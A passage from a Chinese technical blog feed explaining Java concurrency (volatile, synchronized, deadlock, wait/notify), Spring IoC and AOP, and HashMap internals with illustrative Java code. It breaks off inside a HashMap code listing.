volatile变量修饰符</h2><p>Java语言规范中指出：为了获得最佳速度，允许线程保存共享成员变量的私有拷贝，而且只当线程进入或者离开同步代码块时才将私有拷贝与共享内存中的原始值进行比较。这样当多个线程同时与某个对象交互时，就必须注意到要让线程及时的得到共享成员变量的变化。而volatile关键字就是提示JVM：对于这个成员变量，不能保存它的私有拷贝，而应直接与共享成员变量交互。</p><p>volatile是一种稍弱的同步机制，在访问volatile变量时不会执行加锁操作，也就不会执行线程阻塞，因此volatilei变量是一种比synchronized关键字更轻量级的同步机制。</p><p>使用建议：在两个或者更多的线程需要访问的成员变量上使用volatile。当要访问的变量已在synchronized代码块中，或者为常量时，没必要使用volatile。<br />由于使用volatile屏蔽掉了JVM中必要的代码优化，所以在效率上比较低，因此一定在必要时才使用此关键字。</p><p><a href="http://www.importnew.com/20566.html" target="_blank" rel="noopener">有一个案例分析</a></p><h2 id="runnable和thread实现多线程的区别"><a class="markdownIt-Anchor" href="#runnable和thread实现多线程的区别"></a> Runnable和Thread实现多线程的区别</h2><p>Java实现多线程的方法：继承Thread类、实现Runnable接口、实现Callable接口。在程序开发中，一般用Runnable接口为主，优势如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/4470227-c0c19b294153e96c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Runnable的优势.png" /></p><p>以下是两个程序的对比:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">5</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"ticket = "</span> + ticket--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131206094239437.jpg" alt="" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">5</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"ticket = "</span> + ticket--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunnableDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyThread my = <span class="keyword">new</span> MyThread();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131206094642328.jpg" alt="" /></p><p><strong>补充：</strong></p><ol><li>在第二种方法中，输出无法预测，因为ticket-不是原子操作</li><li>在第一种方法中，我们new了3个Thread对象，即三个线程分别执行三个对象中的代码，因此便是三个线程去独立地完成卖票的任务；而在第二种方法中，我们同样也new了3个Thread对象，但只有一个Runnable对象，3个Thread对象共享这个Runnable对象中的代码，因此，便会出现3个线程共同完成卖票任务的结果。如果我们new出3个Runnable对象，作为参数分别传入3个Thread对象中，那么3个线程便会独立执行各自Runnable对象中的代码，即3个线程各自卖5张票。</li><li>在第二种方法中，由于3个Thread对象共同执行一个Runnable对象中的代码，因此可能会造成线程的不安全，比如可能ticket会输出-1（如果我们System.out….语句前加上线程休眠操作，该情况将很有可能出现），这种情况的出现是由于，一个线程在判断ticket为1&gt;0后，还没有来得及减1，另一个线程已经将ticket减1，变为了0，那么接下来之前的线程再将ticket减1，便得到了-1。这就需要加入同步操作（即互斥锁），确保同一时刻只有一个线程在执行每次for循环中的操作。而在第一种方法中，并不需要加入同步操作，因为每个线程执行自己Thread对象中的代码，不存在多个线程共同执行同一个方法的情况。</li></ol><h2 id="使用synchronized获取互斥锁"><a class="markdownIt-Anchor" href="#使用synchronized获取互斥锁"></a> 使用synchronized获取互斥锁</h2><p>在并发编程中，多线程同时并发访问的资源叫做临界资源，当多个线程同时访问对象并要求操作相同资源时，分割了原子操作就有可能出现数据的不一致或数据不完整的情况，为避免这种情况的发生，我们会采取同步机制，以确保在某一时刻，方法内只允许有一个线程。</p><p>采用synchronized修饰符实现的同步机制叫做互斥锁机制，它所获得的锁叫做互斥锁。每个对象都有一个monitor(锁标记)，当线程拥有这个锁标记时才能访问这个资源，没有锁标记便进入锁池。任何一个对象系统都会为其创建一个互斥锁，这个锁是为了分配给线程的，防止打断原子操作。每个对象的锁只能分配给一个线程，因此叫做互斥锁。</p><p>下面是几点说明：</p><ul><li>如果同一个方法内同时有两个或更多线程，则每个线程有自己的局部变量拷贝。</li><li>类的每个实例都有自己的对象级别锁。当一个线程访问实例对象中的synchronized同步代码块或同步方法时，该线程便获取了该实例的对象级别锁，其他线程这时如果要访问synchronized同步代码块或同步方法，便需要阻塞等待，直到前面的线程从同步代码块或方法中退出，释放掉了该对象级别锁。</li><li>访问同一个类的不同实例对象中的同步代码块，不存在阻塞等待获取对象锁的问题，因为它们获取的是各自实例的对象级别锁，相互之间没有影响。</li><li>持有一个对象级别锁不会阻止该线程被交换出来，也不会阻塞其他线程访问同一示例对象中的非synchronized代码。当一个线程A持有一个对象级别锁（即进入了synchronized修饰的代码块或方法中）时，线程也有可能被交换出去，此时线程B有可能获取执行该对象中代码的时间，但它只能执行非同步代码（没有用synchronized修饰），当执行到同步代码时，便会被阻塞，此时可能线程规划器又让A线程运行，A线程继续持有对象级别锁，当A线程退出同步代码时（即释放了对象级别锁），如果B线程此时再运行，便会获得该对象级别锁，从而执行synchronized中的代码。</li><li>持有对象级别锁的线程会让其他线程阻塞在所有的synchronized代码外。例如，在一个类中有三个synchronized方法a，b，c，当线程A正在执行一个实例对象M中的方法a时，它便获得了该对象级别锁，那么其他的线程在执行同一实例对象（即对象M）中的代码时，便会在所有的synchronized方法处阻塞，即在方法a，b，c处都要被阻塞，等线程A释放掉对象级别锁时，其他的线程才可以去执行方法a，b或者c中的代码，从而获得该对象级别锁。</li><li>使用synchronized（obj）同步语句块，可以获取指定对象上的对象级别锁。obj为对象的引用，如果获取了obj对象上的对象级别锁，在并发访问obj对象时时，便会在其synchronized代码处阻塞等待，直到获取到该obj对象的对象级别锁。当obj为this时，便是获取当前对象的对象级别锁。</li><li>类级别锁被特定类的所有示例共享，它用于控制对static成员变量以及static方法的并发访问。具体用法与对象级别锁相似。</li><li>互斥是实现同步的一种手段，临界区、互斥量和信号量都是主要的互斥实现方式。synchronized关键字经过编译后，会在同步块的前后分别形成monitorenter和monitorexit这两个字节码指令。根据虚拟机规范的要求，在执行monitorenter指令时，首先要尝试获取对象的锁，如果获得了锁，把锁的计数器加1，相应地，在执行monitorexit指令时会将锁计数器减1，当计数器为0时，锁便被释放了。由于synchronized同步块对同一个线程是可重入的，因此一个线程可以多次获得同一个对象的互斥锁，同样，要释放相应次数的该互斥锁，才能最终释放掉该锁。</li></ul><h2 id="多线程环境下安全使用集合api"><a class="markdownIt-Anchor" href="#多线程环境下安全使用集合api"></a> 多线程环境下安全使用集合API</h2><p><a href="http://www.importnew.com/20624.html" target="_blank" rel="noopener">Java并发编程（8）：多线程环境中安全使用集合API（含代码）</a></p><h2 id="死锁"><a class="markdownIt-Anchor" href="#死锁"></a> 死锁</h2><p>线程A当前持有互斥所锁lock1，线程B当前持有互斥锁lock2。接下来，当线程A仍然持有lock1时，它试图获取lock2，因为线程B正持有lock2，因此线程A会阻塞等待线程B对lock2的释放。如果此时线程B在持有lock2的时候，也在试图获取lock1，因为线程A正持有lock1，因此线程B会阻塞等待A对lock1的释放。二者都在等待对方所持有锁的释放，而二者却又都没释放自己所持有的锁，这时二者便会一直阻塞下去。这种情形称为死锁。</p><p>下面介绍避免死锁的几种常见方法：</p><ol><li>避免一个线程获取多个锁</li><li>避免一个线程在锁内同时占用多个资源，尽量保证每个锁只占用一个资源</li><li>尝试使用定时锁，使用lock.tryLock(timeout)来代替使用内部锁机制</li><li>对于数据库锁，加锁和解锁必须在一个数据库连接里，否则会出现解锁失败的情况</li></ol><h2 id="使用waitnotifynotifyall实现线程间通信"><a class="markdownIt-Anchor" href="#使用waitnotifynotifyall实现线程间通信"></a> 使用wait/notify/notifyAll实现线程间通信</h2><p>在Java中，可以通过配合调用Object对象的wait()方法和notify()方法或notifyAll()方法来实现线程间的通信。在线程中调用wait()方法，将阻塞等待其他线程的通知（其他线程调用notify()方法或notifyAll()方法），在线程中调用notify()方法或notifyAll()方法，将通知其他线程从wait()方法处返回。</p><p>Object是所有类的超类，它有5个方法组成了等待/通知机制的核心：notify()、notifyAll()、wait()、wait(long)和wait(long, int)。在Java中，所有的类都从Object继承而来，因此，所有的类都拥有这些共有方法可供使用。而且，由于他们都被声明为final，因此在子类中不能覆写任何一个方法。</p><p><strong>注意：</strong></p><ul><li>如果线程调用了对象的wait()方法，那么线程便会处于该对象的等待池中，等待池中的线程不会去竞争该对象的锁。</li><li>当有线程调用了对象的notifyAll()方法（唤醒所有wait线程）或notify()方法（只随机唤醒一个wait线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。</li><li>优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它还会留在锁池中，唯有线程再次调用wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了synchronized代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 并发编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring的IOC与AOP特性</title>
      <link href="/ioc-and-aop/"/>
      <url>/ioc-and-aop/</url>
      
        <content type="html"><![CDATA[<h2 id="spring的ioc特性"><a class="markdownIt-Anchor" href="#spring的ioc特性"></a> Spring的IOC特性</h2><h3 id="什么是控制反转"><a class="markdownIt-Anchor" href="#什么是控制反转"></a> 什么是控制反转</h3><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-a8f81355f8c40277.jpg" alt="图1. 控制反转" /></p><p>见图1，软件中的对象就如同图中的齿轮，协同工作，互相耦合，若是一个零件不能正常工作，则会导致整个系统的奔溃，这就是强耦合系统。为了解决对象间耦合度过高的问题，软件专家Michael Mattson提出了IoC理论。</p><p>控制反转(Inversion of Control)是一种面向对象编程中的一种设计原则，用来解决计算机代码之间的耦合度。其基本思想是：借助于&quot;第三方&quot;实现具有依赖关系的对象之间的耦合。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-581580a9c05886ea.jpg" alt="图2. IoC" /></p><p>见图2，由于引进了IoC容器，使得A、B、C、D这四个对象没有了耦合关系，对象的控制权全部由IoC容器负责。</p><p>我们再次来对比一下：</p><ol><li>软件系统在没有引入IoC容器之前，如图1，对象A依赖与对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。</li><li>软件系统在引入IoC容器之后，就完全不同了。如图2，由于IoC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要B的对象，IoC容器会主动创建一个对象B注入到对象A需要的地方。</li></ol><p>通过对比，可以看出对象A依赖对象B的过程，由主动行为变成了被动行为，控制权颠倒了过来，这就是&quot;控制反转&quot;的由来。</p><h3 id="什么是依赖注入"><a class="markdownIt-Anchor" href="#什么是依赖注入"></a> 什么是依赖注入</h3><p>当A对象需要调用B对象方法时，这种情况在Spring中称为依赖，即A对象依赖B对象，Spring把互相调用的关系称为依赖关系。</p><p>在传统模式下当需要调用其他对象的方法时，一般有以下两种方式：</p><ul><li>原始做法：调用者主动创建被依赖对象，然后再调用被依赖对象的方法。</li><li>简单工厂模式：调用者先找到被依赖对象的工厂，然后主动通过工厂去获取被依赖对象，最后再调用被依赖对象的方法。</li></ul><p>对于第一种方式，由于调用者需要通过形如&quot;new 被依赖对象构造器();&quot;的代码来创建对象，这种方式会导致调用者与被依赖对象实现类的硬编码耦合，不利于项目升级维护。</p><p>对于第二种方式，要把握一下三点：</p><ul><li>调用者面向被依赖对象的接口编程</li><li>将被依赖对象的创建交给工厂完成</li><li>调用者通过工厂来获得被依赖组件</li></ul><p>这样，调用者只需与被依赖对象的接口耦合，这样就避免了类层次的硬编码耦合。缺点是，调用组件需要主动通过工厂去获取被依赖对象，这就会带来调用组件与被依赖对象的耦合。</p><p>当使用Spring容器后，程序无须使用new调用构造器去创建对象，所有的Java对象都可交给Spring容器去创建；当调用者需要被依赖对象的方法时，调用者无须主动获取被依赖对象，只需要等待Spring容器注入即可。</p><h3 id="控制反转与依赖注入的关系"><a class="markdownIt-Anchor" href="#控制反转与依赖注入的关系"></a> 控制反转与依赖注入的关系</h3><ul><li>控制反转是一种思想</li><li>依赖注入是一种设计模式</li></ul><p>IoC框架使用依赖注入作为实现控制反转的方式，但是控制反转还有其他的实现方式，例如说ServiceLocator，所以不能将控制反转和依赖注入等同。</p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3><hr /><ul><li><a href="http://blog.xiaohansong.com/2015/10/21/IoC-and-DI/" target="_blank" rel="noopener">《控制反转（IoC）与依赖注入（DI）》</a></li><li>《轻量级JavaEE企业应用实战》（第4版）李刚 编著</li></ul><h2 id="spring的aop特性"><a class="markdownIt-Anchor" href="#spring的aop特性"></a> Spring的AOP特性</h2><p><em>以下内容来自于博客<a href="https://www.ibm.com/developerworks/cn/java/j-lo-springaopcglib/index.html" target="_blank" rel="noopener">Spring AOP 实现原理与 CGLIB 应用</a></em></p><p>AOP（Aspect Orient Programming）,作为面向对象编程的一种补充，广泛应用于处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等。AOP实现的关键就在于AOP框架自动创建的AOP代理，AOP代理则可分为静态代理和动态代理两大类，其中静态代理是指AOP框架提供的命令进行编译，从而在编译阶段就可生成AOP代理类，因此也被称为编译时增强；而动态代理则是在运行时借助于JDK动态代理、CGLIB等在内存中“临时”生成AOP动态代理类，因此也被称为运行时增强。</p><h3 id="aop的存在价值"><a class="markdownIt-Anchor" href="#aop的存在价值"></a> AOP的存在价值</h3><p>在传统的OOP编程里以对象为核心，整个软件系统由一系列相互依赖的对象组成，而这些对象将被抽象成一个个类，并允许使用类继承来管理类与类之间一般到特殊的关系。随着软件规模的增大，应用的逐渐升级，慢慢出现了一些OOP很难解决的问题。</p><p>我们可以通过分析、抽象出一系列具有一定属性与行为的对象，并通过这些对象的协作来形成一个完整的软件功能。由于对象可以继承，因此我们可以把具有相同功能或相同特性的属性抽象到一个层次分明的类结构体系中。随着软件规范的不断扩大，专业化分工越来越系列，以及OOP应用实践的不断增多，随之也暴露出了一些OOP无法很好解决的问题。</p><p>现在假设系统中有3段完全相似的代码，这些代码通常会采用“复制”、“粘贴”方式来完成，通过这种“复制”、“粘贴”方式开发出来的软件如图3所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-508a18311f425fbf.jpg" alt="图3. 多个地方包含相同代码的软件" /></p><p>看到如图3所示的示意图，可以看到了这种设计的不足之处。当有一天，图1中的深色代码段需要修改，那是不是要打开3个地方的代码进行修改？如果不是3个地方包含这段代码，而是100个地方，甚至是1000个地方包含这段代码段，那会是什么后果？</p><p>为了解决这个问题，我们通常会采用将如图3所示的深色代码部分定义成一个方法，然后在3个代码段中分别调用该方法即可。在这种方式下，软件系统的结构如图4所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-b6306a904bb675ae.jpg" alt="图4. 通过方法调用实现系统功能" /></p><p>对于如图4所示的软件系统，如果需要修改深色部分的代码，只要修改一个地方即可，不管整个系统中有多少方法调用了该方法，程序无须修改这些地方，只需要修改被调用的方法即可——通过这种方式，大大降低了软件后期维护的复杂度。</p><p>对于如图4所示的方法1、方法2、方法3依然需要显式调用深色方法，这样做能够解决大部分应用场景。但对于一些更特殊的情况：应用需要方法1、方法2、方法3彻底与深色方法分离——方法1、方法2、方法3无须直接调用深色方法，该如何解决？</p><p>因为软件系统需求变更是非常频繁的事情，系统前期设计方法1、方法2、方法3时只实现了核心业务功能，过了一段时间，我们需要为方法1、方法2、方法3都增加事务控制；又过了一段时间，客户提出方法1、方法2、方法3需要进行用户合法性验证。只有合法的用户才能执行这些方法。因此，我们希望有一种特殊的方法：我们只要定义该方法，无须在方法1、方法2、方法3中显式调用它，系统会“自动”执行该特殊方法。</p><p>实现上述需求的技术就是AOP。AOP专门用于处理系统中分布于各个模块（不同方法）中交叉关注点的问题，在JavaEE应用中，常常通过AOP来处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等，AOP已经成为一种非常常用的解决方案。</p><h3 id="spring-aop原理剖析"><a class="markdownIt-Anchor" href="#spring-aop原理剖析"></a> Spring AOP原理剖析</h3><p>Spring AOP框架对AOP代理类的处理原则是：如果目标对象的实现类实现了接口，Spring AOP将会采用JDK动态代理来生成AOP代理类；如果目标对象的实现类没有实现接口，Spring AOP将会采用CGLIB来生成AOP代理类——不过这个选择过程对开发者完全透明、开发者无须关心。</p><p>AOP代理其实是由AOP框架动态生成的一个对象，该对象可作为目标对象使用。AOP代理包含了目标对象的全部方法，但AOP代理中的方法与目标对象的方法存在差异：AOP方法在特定切入点添加了增强处理，并回调了目标对象的方法。</p><p>AOP代理所包含的方法与目标对象的方法示意图如图5所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-33be778218ec316b.gif" alt="图5. AOP代理的方法与目标对象的方法" /></p><p>Spring的AOP代理有Spring的IoC容器负责生成、管理，其依赖关系也有IoC容器负责管理。因此，AOP代理可以直接使用容器中的其他Bean实例作为目标，这种关系可由IoC容器的依赖注入提供。</p><p>纵观AOP编程，其中需要程序员参与的只有3个部分：</p><ul><li>定义普通业务组件</li><li>定义切入点，一个切入点可能横切多个业务组件</li><li>定义增强处理，增强处理就是在AOP框架为普通业务组件织入的处理动作</li></ul><p>上面3个部分的第一个部分是最平常不过的事情，无须额外说明。那么进行AOP编程的关键就是定义切入点和定义增强处理。一但定义了合适的切入点和增强处理，AOP框架将会自动生成AOP代理，而AOP代理的方法大致有如下公式：</p><p><strong>代理对象的方法 = 增强处理 + 被代理对象的方法</strong></p><p>Spring AOP的实现原理：AOP框架负责动态生成AOP代理类，这个代理类的方法则由Advice和回调方法对象的方法所组成。</p><p>对于前面提到的图4所示的软件调用结构：当方法1、方法2、方法3…都需要去调用某个具有“横切”性质的方法时，传统的做法是程序员去手动修改方法1、方法2、方法3…通过代码来调用这个具有“横切”性质的方法，但这种做法的可扩展性不好，因为每次都要修改代码。</p><p>于是AOP框架出现，AOP框架则可以“动态的”生成一个新的代理类，而这个代理类所包含的方法1、方法2、方法3的代码，程序员只要定义切入点即可——AOP框架所生成的AOP代理类中包含了新的方法1、方法2、方法3，而AOP框架会根据切入点来决定是否要在方法1、方法2、方法3中回调具有“横切”性质的方法。</p><p>简而言之：AOP原理的奥妙就在于动态地生成了代理类，这个代理类实现了图2的调用——这种调用无须程序员修改代码。</p><h3 id="参考资料-2"><a class="markdownIt-Anchor" href="#参考资料-2"></a> 参考资料</h3><ul><li>《轻量级JavaEE企业应用实战》（第4版）李刚 编著</li><li>《疯狂Java讲义》李刚 编著</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap实现原理</title>
      <link href="/hashMap/"/>
      <url>/hashMap/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>关注点</th><th>结论</th></tr></thead><tbody><tr><td>是否允许空</td><td>key和value都运行空</td></tr><tr><td>是否允许重复元素</td><td>key重复会覆盖，value允许重复</td></tr><tr><td>是否有序</td><td>无序</td></tr><tr><td>是否线程安全</td><td>非线程安全</td></tr></tbody></table><h2 id="hashmap的数据结构"><a class="markdownIt-Anchor" href="#hashmap的数据结构"></a> HashMap的数据结构</h2><p>在Java语言中，最基本的两种结构就是数组和模拟指针（引用），所有的数据结构都可以使用这两个基本结构来构造。HashMap实际就是一个&quot;链表散列&quot;的数据结构，即数组与链表的结合体。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-fda48f04c751b2e9.jpg" alt="" /></p><p>从上图可以看出，HashMap底层就是一个数组结构，数组中的每一项又是一个链表。当新建一个HashMap的时候，就会初始化一个数组。</p><p>首先看一下HashMap的一个存储单元Node：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">        Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.hash = hash;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">"="</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">            V oldValue = value;</span><br><span class="line">            value = newValue;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">                <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                    Objects.equals(value, e.getValue()))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有上面代码可以看出，Node就是数组中的元素，每个Map.Entry其实就是一个Key-value对，它持有一个指向下一个元素的引用，这就构成了链表。</p><h2 id="功能实现-方法"><a class="markdownIt-Anchor" href="#功能实现-方法"></a> 功能实现-方法</h2><h3 id="确定哈希桶数组索引位置"><a class="markdownIt-Anchor" href="#确定哈希桶数组索引位置"></a> 确定哈希桶数组索引位置</h3><p>不管增加、删除、查找键值对，定位到哈希桶数组的位置都是关键的一步，而定位数组索引的主要方法如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jdk1.8 &amp; jdk1.7</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">// 第一步：h = key.hashCode() 取hashCode值</span></span><br><span class="line">    <span class="comment">// 第二步：h ^ (h &gt;&gt;&gt; 16)     高位参与运算</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jdk1.7的源码，jdk1.8没有这个方法，但是实现原理一样的</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">indexFor</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 第三步: 取模运算</span></span><br><span class="line">     <span class="keyword">return</span> h &amp; (length-<span class="number">1</span>);  </span><br><span 